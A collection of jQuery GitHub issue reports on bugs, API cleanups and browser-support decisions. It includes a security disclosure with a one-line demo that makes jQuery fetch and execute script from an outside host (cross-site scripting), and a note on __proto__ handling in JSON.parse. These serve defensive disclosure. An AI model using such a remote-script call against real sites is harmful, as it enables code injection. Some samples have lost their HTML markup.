title: There should be a common event for any DOM Manipulation
body:
Hi, I'm looking for this for a long time. Currently there is no common event on DOM Manipulation. There should be an event which is fired on any of these function calls: https://api.jquery.com/category/manipulation/

The event can be fired on document or window so that any changes on DOM can be detected.

title: .animate() doesn't do anything on apparently random page loads
body:
Using jQuery 2.1.0 on latest Chrome and Firefox on Windows 8.1

This bug seems to happen randomly, maybe once every 30-50 times I reload my web app. It also happened on other people's browsers. 

I want to animate the width of element #a to a fixed value. I call `$("#a").animate({"width": "600px", 1000, callback)`, with the callback simply logging a success message in the console. Most of the time, it works perfectly fine.

But, on rare occasions, when I load my web app, this instruction doesn't do anything: 
- the width doesn't change
- the end callback is never called
- the element #a is never `:animated`

And this behavior remains the same until I reload the page, not matter how many times I try to call `$("#a").animate()`. However, I can still:
- change css properties of #a directly: `$("#a").css()`
- animate other elements: `$("#b").animate()`

Unfortunately, since this bug is not reproducible so I cannot provide a fiddle. I've only been able to investigate it because I saw it happen once, and dug down the issue with the console.

title: Android 4.0-4.3 special-treats __proto__ in JSON.parse
body:
Androids 4.0-4.3 (surprisingly Android 2.3 is fine) treats `__proto__` specially in `JSON.parse`:

``` js
var o = JSON.parse('{"__proto__": []}');
"length" in o; // true
```

This may lead to security issues if `Array.prototype` is extended (and we only forbid [messing with `Object.prototype`](https://contribute.jquery.org/wont-fix/)):
http://jsbin.com/kuwedo/edit?js,output

Should we work around it? Deleting `__proto__` on the result and using `$.extend` seems to help:
http://jsbin.com/cocena/edit?js,output

title: How to clone jQuery library (copy by value)
body:
I opened a question on SO at http://stackoverflow.com/questions/31724461/how-to-clone-jquery-library-copy-by-value

I'm basically looking for a way to duplicate my `$` variable to expose a copy (by value). I could easily expose a copy by reference but I must keep my library on a sandbox and so that's not acceptable.

What would be the best way to achieve this?

Thanks.

title: Don't expose jQuery.access
body:
`jQuery.access` is public & undocumented, is there a reason we should keep it that way? We removed `jQuery.swap` (#2058), `jQuery.buildFragment` (#2224) & `jQuery.domManip` (#2225).

See also #2512.

title: Don't expose jQuery.dir & jQuery.sibling
body:
We have a few more undocumented APIs shipped under the jQuery object; two of them are `jQuery.dir` & `jQuery.sibling`.

Is there any reason why they should be exposed & undocumented? We should minimize the number of such cases as we did with `jQuery.swap` (#2058), `jQuery.buildFragment` (#2224) & `jQuery.domManip` (#2225).

See also #2513.

title: Input Blur not work for IE, keeps focus but not fire any delegated events anymore
body:
Here is a test suite for both main jquery branches

jquery 1.x branch
https://jsfiddle.net/po6x9763/10/

jquery 2.x branch
https://jsfiddle.net/po6x9763/11/

In the second field "disabled and blur" the field will loose focus in every browser except IE 11 (tested also with IE8 native and all simulated IE 11 versions like 10,9,8).
In IE the focus is still on that field, you can type in, but all delegated events that require a focus not fire anymore like "keyup".

Update: It works well with the brand new Micorosft Edge as expected, only native IE have this problem.

That is a big problem because all things that you do like validation with key events will not trigger but you can still type in anything. And also many other cases, it's on your imagination.

title: ajaxBeforeSuccess Global Event, ajaxPrefilters on Promises?
Include color animations in core
body: It's f***ing ridiculous that to this day, one still needs to use a plugin in order to be able to animate colors. It's about time (it's been for years) to have this functionality included into the core

title: Add basic tests for Android 2.3 on master, drop full support
body:
jQuery 3.0.0 will include only basic support for Android 2.3, bigger non-critical workarounds like `reliableMarginRight` will be `compat`-only.

Those tests need to be written.

To not create further divergence between `master` & `compat` test files, I propose to create a separate `android` "module" with those basic tests. Thoughts?

title: Data: new data-as-expando implementation does not clear user data
body: The new data-as-expando (d702b7637a61e1973e08c27b8d8de2ed24a543e2) stopped clearing data off the element in `cleanData`. Cleaning private data was added back (332fd941b4ae80e8ca5e5a20aca91806038f4816) but not user data. This is inconsistent with 1.x/2.x/compat.

title: Switch support tests to use document.documentElement instead of document.body
body:
See https://github.com/jquery/jquery/issues/2133#issuecomment-125375758. I used `document.body` for support tests in `1.11` because of test failures but it seems no longer to be a problem, I'm able to run support tests in IE8 before document ready and they give correct result. We can synchronize these code paths.

Refs gh-2133.

title: Support non-browser environments in jQuery Compat
body: Per today's meeting, we'll try to support non-browser environments in jQuery Compat.

title: XHR throws an exception accessing responseText, if responseType === "arraybuffer"
Error: Syntax error, unrecognized expression: unsupported pseudo: chekced
using hasOwnProperty to check for a property that exists in the prototype
body:
Hi,

It seems like jQuery is using hasOwn / hasOwnProperty to check for a property on an object. 

Where the property exists in the prototype of the object Chrome has started returning false as per the following post:

https://developers.google.com/web/updates/2015/04/DOM-attributes-now-on-the-prototype?hl=en

It seems that using the "in" operator may resolve this issue.

Here is an example of where the problem occurs in jQuery-2.1.4.js

line 4264-4269
trigger: function( event, data, elem, onlyHandlers ) {

```
var i, cur, tmp, bubbleType, ontype, handle, special,
eventPath = [ elem || document ],
type = hasOwn.call( event, "type" ) ? event.type : event,
namespaces = hasOwn.call( event, "namespace" ) ? event.namespace.split(".") : [];
```

which then causes an issue here

line 4283
    if ( type.indexOf(".") >= 0 ) {

Hope this makes sense.

Daniel

title: Consider using conventional-changelog to generate changelog or github release?
body:
we have [conventional-changelog](https://github.com/ajoslin/conventional-changelog) or [conventional-github-releaser](https://github.com/stevemao/conventional-github-releaser) (there are also grunt/gulp tasks) to automate the process of writing the changelog. As you are using formatted commit messages so the logs can be generated well according to the parts of the message. We use handlebars for templating the logs. It can also ignore reverted commits. There are many other features. We have a jquery preset for people using jquery commit format.
The modules are actively maintained.

title: Uncaught RangeError when triggering event with big array in parameter
body:
``` js
var arr = [];
for(var i = 0; i <= 85000; i++) {
    arr.push(i);
}

var el = jQuery('body');
el.on('test-event', function(){});
el.trigger('test-event', arr);
```

> Uncaught RangeError: Maximum call stack size exceeded
>     at HTMLDivElement.jQuery.event.dispatch (https://code.jquery.com/jquery-1.11.3.js:4670:9)
>     at HTMLDivElement.elemData.handle (https://code.jquery.com/jquery-1.11.3.js:4338:46)
>     at Object.jQuery.event.trigger (https://code.jquery.com/jquery-1.11.3.js:4579:12)
>     at HTMLDivElement.<anonymous> (https://code.jquery.com/jquery-1.11.3.js:5289:17)
>     at Function.jQuery.extend.each (https://code.jquery.com/jquery-1.11.3.js:384:23)
>     at jQuery.fn.jQuery.each (https://code.jquery.com/jquery-1.11.3.js:136:17)
>     at jQuery.fn.extend.trigger (https://code.jquery.com/jquery-1.11.3.js:5288:15)
>     at <anonymous>:10:3
>     at Object.InjectedScript._evaluateOn (<anonymous>:895:140)
>     at Object.InjectedScript._evaluateAndWrap (<anonymous>:828:34)

---

Looks like the problem in these lines (https://github.com/jquery/jquery/blob/master/src/event.js#L323-L325). `data` not wrapped to array if it is array:

``` js
        data = data == null ?
            [ event ] :
            jQuery.makeArray( data, [ event ] );
```

title: Table manipulation regression (XHTML)
body:
jQuery 3.0 introduced an XHTML regression in the appending and updating of table rows, it appears the outermost element in every `.append()`, `.html()`, `.load()`, etc gets removed and only the contents of that outermost element are actually appended or set as the innerHTML. Simple test case (requires `Content-type: application/xhtml+xml; charset=utf-8;` to properly demonstrate the regression) ``` html
One Two Three
``` ``` javascript $(document).ready(function(){ $('#append').append('FourFiveSix'); $('#append').append('SevenEightNine'); }); ``` In XHTML mode, the resulting DOM is the equivalent of: ``` html
One Two Three
Four Five Six Seven Eight Nine
``` I've also noticed the XHTML test harness is once again broken and likely how this regression occurred, but that's outside the scope of this issue.

title: Elements are not selected by ID if the ID contains a dot
body:
According to both the HTML 4 and the HTML 5 specifications, the ID-attribute may contain dots (but not as first character in HTML 4). However, if an ID contains a dot, jQuery does not select the element when doing `jQuery('#');`. I've tested this in Firefox 39.0 (Ubuntu version) and Chromium 43.0.2357.130 Ubuntu 15.04 (64-bit). Test program that exhibits the buggy behavior: ``` Test!
foobar
``` Test program not using jQuery for selection, that does not exhibit the buggy behavior: ``` Test!
foobar
```

title: Remove the unspecified-class .toggleClass signature
body:
cf. jquery/api.jquery.com/issues/781

`.toggleClass( [boolean] )` is [inaccurately documented](http://api.jquery.com/toggleClass/#toggleClass-state), (probably) not working correctly, easy to manually implement by library consumers, and I can't even come up with a reasonable use case calling for removal/restoration of all classes.

title: css('clip-path', ..) not working
body:
(using jQuery 2.1.4)

I have the following code:

``` js
$(div).css('clip-path', 'polygon(50% 0%, 0% 100%, 100% 100%)')
```

However, it does not prefix the `clip-path` style. The following works:

``` js
$(div).css('-webkit-clip-path', 'polygon(50% 0%, 0% 100%, 100% 100%)')
```

It seems like this rule (and maybe others?) only works in Chrome with a vendor prefix. However, since the following is true, the `css()` method assumes that the non-prefix style should work:

``` js
('clipPath' in div.style) === true
```

title: Incorrect the 'slideDown' method behavior with element with height 0
body:
Here is an example of this issue. Steps to reproduce it:
1. Open example using link: http://jsfiddle.net/j53j1mLq/
2. Click on the 'Toggle' button (maybe several times)
3. As you can see, element with height 0 become visible for a short time and it's hidden after that
I'm waiting for no reaction method call because of element height.

Description: on every button click the 'slideDown' and the 'slideUp' methods are called for the 'box' element in rotation.

title: bug with function() and $.AJAX() plugins
body:
There seems to be a bug with $.ajax, when you put a "plug-in" function inside the function() where the plugin only gets called once.  I'm not sure if it's with all the functions, or just some of them.  I know it's with the accordion for sure, but not sure if anything else behaves that way, or not.

There should be a built in ajax listener for the function().

I'm assuming that no one else has ever encountered this issue, but it wasn't solved by a discussion, so now it is a bug in the core.  the temporary work around for the problem is to press f5 on the page, but the long term fix would be to patch the core.

title: Microsoft Edge compat
body:
Hey there jQs,

I am going to be the point of contact for library compatibility Edge. Do you know the current compat ranges for jQuery, and any bugs that are blocking operational compat with Edge?
- Daniel

title: Reduce Android 2.3 support on master (was: Investigate Android 2.3 support)
body:
### We're already not fully supporting Android 2.3

The hard truth is we've never fully supported Android 2.3. First of all, our unit tests don't pass there in a couple of modules: http://swarm.jquery.org/job/942. There are serious AJAX issues with error handling: #1786, #2458 (#2458 seems pretty serious, see https://github.com/jquery/jquery/pull/2458#issuecomment-119572119), there are manipulation issues with checked radios: #1785.

Even though most of the tests pass, we cheat a little by putting Android 2.3 in special paths in some of them:
1. https://github.com/jquery/jquery/blob/1c59b308d201d6dd0f0aed2ad0256d01b9f68047/test/unit/ajax.js#L1507-L1512
2. https://github.com/jquery/jquery/blob/1c59b308d201d6dd0f0aed2ad0256d01b9f68047/test/unit/event.js#L408-L413
3. https://github.com/jquery/jquery/blob/1c59b308d201d6dd0f0aed2ad0256d01b9f68047/test/unit/manipulation.js#L419-L426 & https://github.com/jquery/jquery/blob/1c59b308d201d6dd0f0aed2ad0256d01b9f68047/test/unit/manipulation.js#L440-L444
4. https://github.com/jquery/jquery/blob/1c59b308d201d6dd0f0aed2ad0256d01b9f68047/test/unit/support.js#L236-L254
### Maintenance cost

There are various problems that happen only on Android 2.3, e.g. now it turns out it doesn't allow unquoted reserved words as property names, exactly as our favorite IE8: #2478. It happens quite often that something just doesn't work, e.g. currently for some reason AJAX tests hang very near the beginning: http://swarm.jquery.org/result/479018. Surprisingly, it works on `compat`: http://swarm.jquery.org/result/479031. Lots of hours are being constantly put into making this browser work with our tests.
### Market share

When we released the last stable version of jQuery, 2.1 (I'm omitting patches) [a year and a half ago](http://blog.jquery.com/2014/01/24/jquery-1-11-and-2-1-released/), Android 2.3 still had a very large market share. Currently [Google stats](http://developer.android.com/about/dashboards/index.html) show it at 5.6% of all Android versions (this is not a mobile market share but Android market share). Real percentage might be a little higher as it's counted via Google Play Store but it's still not that large as it was back then.
### Size

Cutting Android 2.3 support ([see an experimental branch that does it](https://github.com/mzgol/jquery/tree/no-android2.3)) saves 186 bytes gzipped, most of which are the `reliableMarginRight` support test and a workaround. Making all tests pass would add more.
### Resolution?

There are a couple ways to solve the problem:
1. Don't change anything, try to make Android 2.3 finally pass & continue to suffer.
2. Drop support from `master` but keep it on `compat`; still suffer, although a little less (for some reason Android 2.3 problems happen more often on `master` than `compat`).
3. Support Android 2.3 only partially - ensure it parses jQuery correctly, run a few basic tests ensuring most important APIs work on most common inputs. Don't care for perfect compliance: less suffering but such smoke testing may not be effective; also, it's hard to draw the line what's important and what's not.
4. Drop support from both branches, redirect people still needing support to the 1.x & 2.x jQuery lines.

cc @jquery/core @scottgonzalez @arschmitz

title: Drop iOS 6 & Safari 6 support
body:
According to the official Apple Dashboard:
https://developer.apple.com/support/app-store/
currently all iOS versions older than 7 (i.e. not just 6 but all of them) are at 2% or iOS market share (not mobile market share).

Besides, desktop Safari 6 is not possible to install in El Captain, Yosemite & Mavericks i.e. all OS X versions that will receive security fixes once El Captain is released this fall (if Apple continues its current strategy). Note that Mountain Lion can have Safari 6.1 installed which include the engine shared with Safari 7 - it appears in Mac App Store, alongside other system updates.

I don't think it's worth supporting such a browser. We'll already soon test on Safari 7, 8 & 9, that's three versions.

cc @arschmitz as we're talking about mobile browsers as well.

title: catch property needs to be quoted in Android 2.3
body:
Apparently Android 2.3 doesn't like a `catch` property and so it fails deferred tests completely since 84ccf2606c6b97d5875774bf774f9f2aae950ae7. We need to quote it as on the `compat` branch.

Do we have any way to ensure we don't change it back without turning on the JSHint `es3` option? :/ Or maybe via JSCS? cc @rwaldron @markelog.

title: jQuery does not reliably trigger() events added with addEventListener()
body:
jQuery 2.x still has code from 1.x around that attempts to trigger native/custom browser (not the events added with `.on()` ) events when you call `.trigger()`. For backwards compatibility, it uses the [on_event_] accessor. This does not (reliably) expose event handlers added with `addEventListener` though, even though some browsers expose the handler for some events.

As jQuery 2.x does not care about APIs from the stone age any more, it would be great if you instead triggered `dispatchEvent` so that jQuery APIs play nice with non-jQuery APIs.

References:
- There is a reproducer for jQ 2.1.4 at http://jsfiddle.net/av5czueb/1/
- There was a bug report several years ago at http://bugs.jquery.com/ticket/11047
- There is a StackOverflow that nicely describes an instance of the problem at http://stackoverflow.com/questions/25256173/can-i-use-jquery-trigger-with-event-listeners-added-with-addeventlistener

I should mention we encountered this issue when we tried to marry JSON Editor with jQuery Mobile on a select element. It turns out jQuery Mobile manipulates the select DOM node, then calls `trigger('change')` whereas JSON Editor listens for DOM changes using `addEventListener()`.

title: Use element.matches() for event delegation
body:
jQuery's event delegation is based on `jquery.event.handlers` method, which is for handler filtering.

If developer uses event delegation `.on(event, selector, fn)`, everytime when event dispatches, `jquery.event.handlers` calls `jQuery(selector)` , gets a collection of delegated targets, then checks them one by one.

The mechanism is basically same as my event delegation implementation based on `.querySelectorAll()`.

But another implementation based on `element.matches()` is times faster. Would jQuery consider using `.matches()` instead?

http://jsperf.com/matches-vs-queryselectorall

title: Feature request: .parent(n)
body:
It would be nice if the `.parent` and `.parents` function accepted an optional numeric parameter indicating how many levels up to go, or to start, respectively. The 2nd argument could then be the existing optional selector to further filter results. If the first argument is non-numeric, then original behavior would remain.

`.parent(2)` would get the great-grandparent (0 = parent, 1 = grandparent, 2 = great-grandparent) of an element.
`.parent(1, 'div')` would get the second parent (grandparent) of an element, but only if it matches the selector `'div'`.

`.parents(1)` would get all ancestors above/except the first/immediate parent.
`.parents(1, 'div')` would get the same except filtered by the selector.

https://api.jquery.com/parent/
https://api.jquery.com/parents/

If maintainers are open to this, I might submit a PR.

title: dataFilter should be invoked before error callback
body:
`$.ajax` method's are invoked in this order:   
1. `beforeSend`
2. `error`
3. `dataFilter` **
4. `success`
5. _Promise callbacks_
6. `complete`

*\* `dataFilter` is invoked after `error` callback. 

To prevent JSON vulnerabilities, we return prefixed JSON for both error and success responses. But since the `dataFilter` is not invoked before `error`, we end up with `responseText` property only; and no `responseJSON` property that contains the parsed response object. For example:

``` js
")]}',\n{\"error\":{\"message\":\"Invalid parameter\"}}" // ajaxError.responseText
```

`dataFilter` should be invoked before the `error` callback, so we can strip out the prefix and response is correctly parsed.

This is the case for the current versions: 1.11.3 and 2.1.4

title: No longer access to jQuery Custom Events using $({})

body:

Observed in: Chrome 43, IE 11 & FF Developer 40 on Windows 7 64bit

Originally posted on StackOverflow here: http://stackoverflow.com/questions/31181158/jquery-animate-sets-its-own-initial-value-when-animating-width

JSFiddle Example (broken): http://jsfiddle.net/xy1x885n/
JSFiddle Example (fixed): http://jsfiddle.net/xy1x885n/4

---

I'm working on an implementation for a sidebar that slides in from the left, squashing the main content div as it goes.

As you can see from the demo, sliding out works fine but when it comes to sliding back in again the sidebar div is set to 100% width before the animation starts causing a very jarring effect. This is easier to see if you inspect the sidebar element and watch the width css property very carefully.

As Rory McCrossan on the StackOverflow thread points out, replacing `width: "0%"` with `width: 0` solves the issue, leading me to believe this may be a jQuery bug.

title: feature request: jQuery(fn, arg1, .. argN )
ajax empty response required by rfc but parse attempted
body:
when ajax response status code is 205, rfc requires empty body, but jquery attempts to parse using the json converter and fails. We know that parsing an empty string as json will fail, but attempt to parse should not be made for 205 status code.

Surprisingly, for 204 status code, a parse attempt is still made, but the inevitable errors on empty content are discarded. Surely parsing should not be attempted when rfc disallows content?

title: Inadequate/dangerous jQuery behavior for 3rd party text/javascript responses
body:
Because of this https://github.com/jquery/jquery/blob/250a1990baa571de60325ab2c52eabb399c4cf9e/src/ajax/script.js#L18 every text/javascript response gets executed. Even if we made a request to another service. CORS was created exactly to prevent this kind of behavior in JSONP (arbitrary code execution).

So when we do $.get('http://weather.com/sf-weather') or like in Rails' jquery_ujs a form is being sent automatically, the attacker can respond us with text/javascript and execute arbitrary code on our origin.  Demo `$.get('http://sakurity.com/jqueryxss')`

The fix is to not execute responses from 3rd party origins by default and make it an option. Don't know who to cc to discuss it.

P.S. I would switch it off for same origin either, because using subtle redirect_to saving tricks we can redirect user to local JSONP endpoint and still get an XSS but those are much more sophisticated vectors.

title: Set width issue if value in percentage, and the element uses box-sizing:border-box and has border set in pixels
body:
Hi, Sorry if the issue name is a bit long and obscure but it didn't manage to describe that bug properly. I could reproduce this issue with the following jQuery versions: - 1.11.3 - 1.10.2 For the demo purpose I use JSFiddle that uses `jQuery 1.11.0` . Let's imagine this HTML structure: ``` html
``` ``` css .child { box-sizing: border-box; width: 50%; border-right: 15px solid #ff0000; } ``` ``` js $('.child').width('50%'); alert(document.querySelector('.child').style.width); ``` The `alert` will output `65%`, this 65%, is an addition of `50 + 15`. You can see a working demo of this issue on this [JSFiddle](http://jsfiddle.net/ned1xcze/) I dug a little more and could determined that the problem comes from `setPositiveNumber` and `augmentWidthOrHeight` method. It seems that augmentWidthOrHeight doesn't take in account that the border/padding can have different unit compared to the content width. I'm not sure what's the best way to fix that issue so that is why I create that issue instead of doing a pull request. Feel free to ask questions. Thanks for your hard work.

title: $.ajax({ dataType: 'script' }) pending indefinitely in case of error on jQuery 1.x
body:
With jQuery 1.x, when a script request has some kind of error (User not online, DNS can't be resolved, server responds with HTTP 503, etc.) the Promise is never resolved or rejected, it stays pending indefinitely.

In jQuery 2.x it gets instantly rejected.

This can be worked around by attaching a timeout, but users tend not to do that. This causes lots of components to stall indefinitely when certain problems occur with the server, or the user's connection.

Pending indefinitely when using jQuery 1.x on latest Chrome. Be sure to test on an HTTP origin as otherwise Chrome might prevent the request for security reasons (though those errors don't propagate either).

``` js
 $.ajax({ url: 'http://unknown.jquery.com/foo', dataType: 'script', cache: true })
  .then(function () { console.log( 'done' ); }, function () { console.log( 'fail' ); });

 $.ajax({ url: 'http://example.org/404', dataType: 'script', cache: true })
  .then(function () { console.log( 'done' ); }, function () { console.log( 'fail' ); });
```

title: Possible simplification of support functions
body: `jQuery.support` functions check environment invariants only, they could also check state properties of inconstant states too. For example, here we do ``` js if ( !support.pixelMarginRight() && rnumnonpx.test( ret ) && rmargin.test( name ) ) { ``` Instead we could do ``` js if ( !support.pixelMarginRight( ret, name ) ) { ``` Encapsulating and simplifying such conditions.

title: Remove possible overmodulization
body: We can identify places, like https://github.com/jquery/jquery/blob/a644101ed04d0beacea864ce805e0c4f86ba1cd1/src/ajax/var/location.js which could be considered as `overmodulization` since it increases the size and complicates the code.

title: Reverse support.ownLast
body: `jQuery.support.ownLast` is the only support test that's supposed to be `false` when it succeeds. It's confusing, we should reverse its value.

title: Try to reuse div creation
body: `div = document.createElement( "div" )` construction used in many places, we can try to modulize it

title: Be consistent when checking if the node is connected or not
body: We usually tested it with `jQuery.contains( elem.ownerDocument, elem )`, but now we switching to `elem.getClientRects()`

title: Handlers: ability to specify order of execution
.on() vs .addEventListener(): multiple identical event listeners
body:
If we attach the same event listener multiple times with jQuery's `.on()`, it will be attached multiple times.
If we attach the same event listener multiple times with the native `.addEventListener()`, it will be attached only once.
Demo: http://jsbin.com/ramaxayiwo/edit?js,console,output

I'd prefer jQuery's `.on()` to work as the native `.addEventListener()` and discard the subsequent attaches of the same event listener.

Select-Element using .val() setting option to blank when wrong value passed
body:
As per the latest HTML5 specs it clearly stats that if the value setting to an select-element that does not exists than it should point to first option.

But after 1.9.1 release this behaviour is not working.

Latest HTML5 Specs Url: http://www.w3.org/TR/2014/REC-html5-20141028/forms.html#the-select-element

"If nodes are inserted or nodes are removed causing the list of options to gain or lose one or more option elements, or if an option element in the list of options asks for a reset, then, if the select element's multiple attribute is absent, the select element's display size is 1, and no option elements in the select element's list of options have their selectedness set to true, the user agent must set the selectedness of the first option element in the list of options in tree order that is not disabled, if any, to true."

There are older tickets related to this issue but they are marked closed stating 1.9.1 had inconsistent behaviour.

http://bugs.jquery.com/ticket/13514

title: following code works for input type submit, but fails to add disabled to html5 button
Click Event brick default Browser shortcuts behavior for link
body:
Middle-click work perfect (perhaps because it does not catch by default click event).

But as soon as everyone starts to hang handlers for the event click, together forget what is the behavior of the browser.

Behavior Examples:

|  |  |
| --- | --- |
| Open in Background Tab | Ctrl + Left-click or Middle-click |
| Open in Foreground Tab | Ctrl + Shift + Left-click or Shift + Middle-click |
| Open in New Window | Shift + Left-click link |

I suggest a default process events click OK in the browser, or to make it possible to switch off this behavior.

My example (it was used in the same project, so as not to rewrite all handlers)

``` js
jQuery.event.special.click.preDispatch = function( event ) {
            return !(jQuery.nodeName( event.target, "a" ) && (event.ctrlKey || event.shiftKey));
        };
```

title: Could $.trim() regular expression be simple ?
body:
In `src/core.js` , I found that jQuery use the following regular expression to trim whitespace of string

``` javascript
// Support: Android<4.1
// Make sure we trim BOM and NBSP
rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,

```

In https://developer.mozilla.org/en/docs/Web/JavaScript/Guide/Regular_Expressions ,  I found :

``` text
`\s` Matches a single character other than white space. Equivalent to [^ \f\n\r\t\v​\u00a0\u1680​\u180e\u2000-\u200a​\u2028\u2029​\u202f\u205f​\u3000].
```

I think, the `\xA0` is equal to `\u00a0` which is contained in `\s` equivalent white-space characters, and 
the `rtrim` may can be simple:

``` javascript
rtrim = /^[\s\uFEFF]+|[\s\uFEFF]+$/g,
```

Will it cause problem ?

Thank you.

title: Remove or document jQuery.fn.{push,sort,splice}
body:
We should deprecate or document `jQuery.fn.{push,sort,splice}` as we do with most private stuff in 3.0.0. Currently those methods have a comment they're for internal use only.

Summoning @paulirish & @fitzgen as I believe at least Chrome DevTools are using a presence of `object.splice` (or sth other from the list?) as an indicator that the object is array-like which makes jQuery objects display a little nicer than regular objects.

title: In ie11 , when many dropdowns on a page, throwing out of stack error, related to caching
body:
Hi ,

Recently the document mode for our application has been upgraded  from IE8 to Edge.
This has been achieved with a simple change of content attribute for meta tag in _Head.cshtml..
<meta http-equiv="X-UA-Compatible" content="IE=edge" />

The application is working as expected for most of the pages, but breaks where many dropdowns are rendered. The dropdown (Kendo UI Dropdown) lists the record, however, does not let the user to select a value.

In the console, you can find the error as: SCRIPT28: Out of stack space. This issue can be replicated for IE > 10.

There are three solutions which I came across, that allowed the application to run smoothly:
• Keep the IE developer tool (F12) opened.
• Uncheck option ‘Disable script debugging in IE’
• Update the jQuery core library : jquery-1.11.0 at line 3857.
        elem = elem.nodeType ? jQuery.cache[elem[jQuery.expando]] : elem[jQuery.expando];
       with
        elem = elem[jQuery.expando];

With the first two options, the error still persists(in console). But the dropdown are working properly.

But with the last solution , the error goes away totally.

I have also tried updating the jQuery versions to 1.11.3 and 2.x, but nothing helped.

Please provide some technical assistance.

Regards,
Kriti

title: If a callback throws an error all subsequent calls to fire are ignored
body:
See https://jsfiddle.net/mL8b3rvs/ (still exists in 2.1.4).
This is a similar problem as in #1823 except that it refers to the `Callbacks` API.

When using the `Callbacks` API, a callback added with `add` that throws an error on `fire` breaks all subsequent `fire` calls (and remaining listeners in the 1st `fire` call are ignored, too). Maybe you could introduce an option to control the exception handling (e.g. "onError: ignore|log|throw|throwCombined").
The current behavior completely breaks the `Callbacks` object, so at least the call should be surrounded with try/catch to cleanup before rethrowing (`firing=false;`).

title: When requiring jquery from within react-native, you get an error 'document.createElement' is not defined
mouseout fired on tr when changing column
JQuery trying to parse a 204 No content response
body:
When I do an Ajax request and the server return an 204 No content response JQuery (v1.11.3) try to parse the content and I get this error: `JQMIGRATE: jQuery.parseJSON requires a valid JSON string (json = "")`. I don't know if it's the cause but the response I got from the server does have:

```
Content-Length: 4
Content-Type: application/json
```

It's an error from the server but HTTP spec say that a 204 code mean that there's no content so JQuery mustn't try to parse a 204 response. 

Here's how I was used JQuery:                                                           

```
$.ajax({
    url: 'myurl',                                                           
    type: 'DELETE',
    headers: {'Accept':'application/json'},                                              
});                                                                                   
```

title: Standardize the output of the .html() method (decoded)
body:
Hey guys, I found a discrepancy between browsers when using the `.html()` method today. While in the latest Chrome/Firefox I had the following output

``` html
<input type="hidden" class="popover-value" name="value" value="<%- value %>" id="popover-<%- value %>">
```

In Safari 8.0.6 the html output had it's special characters encoded 

``` html
<input type="hidden" class="popover-value" name="value" value="<%- value %>" id="popover-<%- value %>">
```

Actually this is not jQuery's fault, because I can see the same difference if I use the `innerHTML` property. 

So, what are your thoughts about the `.html()` **always** return a decoded HTML string? Wouldn't it be good? If so, I'd be more than happy to implement this enhancement.

ps.: I'm talking about jQuery 2.1.4 here

title: jQuery 3.0 AMD Directory structure isn't contained
body:
The existing 3.0 src file structure looks like this:

```
.
├── ajax
│   ├── jsonp.js
│   ├── load.js
│   ├── parseJSON.js
│   ├── parseXML.js
│   ├── script.js
│   ├── var
│   │   ├── location.js
│   │   ├── nonce.js
│   │   └── rquery.js
│   └── xhr.js
├── ajax.js
├── attributes
│   ├── attr.js
│   ├── classes.js
│   ├── prop.js
│   ├── support.js
│   └── val.js
├── attributes.js
├── callbacks.js
├── core
│   ├── access.js
│   ├── init.js
│   ├── parseHTML.js
│   ├── ready.js
│   ├── support.js
│   └── var
│       └── rsingleTag.js
├── core.js
├── css
│   ├── addGetHookIf.js
│   ├── adjustCSS.js
│   ├── curCSS.js
│   ├── hiddenVisibleSelectors.js
│   ├── showHide.js
│   ├── support.js
│   └── var
│       ├── cssExpand.js
│       ├── getStyles.js
│       ├── isHidden.js
│       ├── rmargin.js
│       ├── rnumnonpx.js
│       └── swap.js
├── css.js
├── data
│   ├── Data.js
│   ├── accepts.js
│   └── var
│       ├── dataPriv.js
│       └── dataUser.js
├── data.js
├── deferred.js
├── deprecated.js
├── dimensions.js
├── effects
│   ├── Tween.js
│   └── animatedSelector.js
├── effects.js
├── event
│   ├── ajax.js
│   ├── alias.js
│   └── support.js
├── event.js
├── exports
│   ├── amd.js
│   └── global.js
├── intro.js
├── jquery.js
├── manipulation
│   ├── _evalUrl.js
│   ├── buildFragment.js
│   ├── getAll.js
│   ├── setGlobalEval.js
│   ├── support.js
│   ├── var
│   │   ├── rcheckableType.js
│   │   ├── rscriptType.js
│   │   └── rtagName.js
│   └── wrapMap.js
├── manipulation.js
├── offset.js
├── outro.js
├── queue
│   └── delay.js
├── queue.js
├── selector-native.js
├── selector-sizzle.js
├── selector.js
├── serialize.js
├── traversing
│   ├── findFilter.js
│   └── var
│       └── rneedsContext.js
├── traversing.js
├── var
│   ├── arr.js
│   ├── class2type.js
│   ├── concat.js
│   ├── document.js
│   ├── documentElement.js
│   ├── hasOwn.js
│   ├── indexOf.js
│   ├── pnum.js
│   ├── push.js
│   ├── rcssNum.js
│   ├── rnotwhite.js
│   ├── slice.js
│   ├── support.js
│   └── toString.js
└── wrap.js
```

The problem here is that the main entry point, `jquery.js` needs to be in the same directory as the core dependencies. For someone to use this with RequireJS without any special configuration, the entire contents of src would need to be within the baseUrl.

Ideally the structure would be nested:

```
.
├── jquery
│   └── ...
└── jquery.js
```

This makes things a lot simpler to directly consume as an AMD module, as you can simply require jquery, and none of it's contents would be polluting your base directory.

title: Strange behavior with iframes, title-cased CSS, and Chrome/Webkit
body:
Migrated from Thread: http://forum.jquery.com/topic/strange-behaviorwith-iframes-title-cased-css-and-chrome-webkit

Long story short - I'm working on a project that is using jQuery to write DOM nodes to an iframe and I found some odd behavior with CSS classes containing capitalized characters. I've narrowed it down to what seems to be an issue with jQuery's `append()` function for `$()`-wrapped HTML, and it affects all versions of jQuery 1.x and 2.x, Chromium/Webkit-based browsers only. See the following JSFiddle using Google Chrome or Safari for the minimal test-case:

http://jsfiddle.net/42t3m7aa/12/

Hopefully the comments are pretty self-explanatory, but as you can see I have a basic CSS class called `.TitleCase` that will color text red. I generate a simple `div` with this class name and add it to the DOM via `append($([html markup here]))`. If I then try to append another DOM node containing that same class name to an `iframe`, it breaks styles from that class in the parent DOM (in other words, the style definitions disappear). There are a bunch of odd workarounds for this that seem to suggest this might be a bug with jQuery.

Workarounds:
- Applying a `setTimeout` to delay the iframe manipulation
- Giving the affected DOM element additional CSS class names or dummy attributes
- Resorting to lowercase CSS class names
- Manually removing and re-adding the class name to the DOM elements
- Passing a string directly to `append()`
- Using another non-jQuery method to generate the element and append it

I suspect the problem lies in how jQuery's `append()` method treats HTML text VS a jQuery object, but i haven't been able to pinpoint exactly why from jQuery's source code.

title: serialize() ignores input elements of type submit
body:
- Try this:
  http://jsbin.com/folonusapu/1/edit?html,js,output
- click on the submit button, whose name attribute's value is "comentar"

Expected output:

> mensaje_id=2&texto=lalala&comentar=Comentar

Observed output:

> mensaje_id=2&texto=lalala

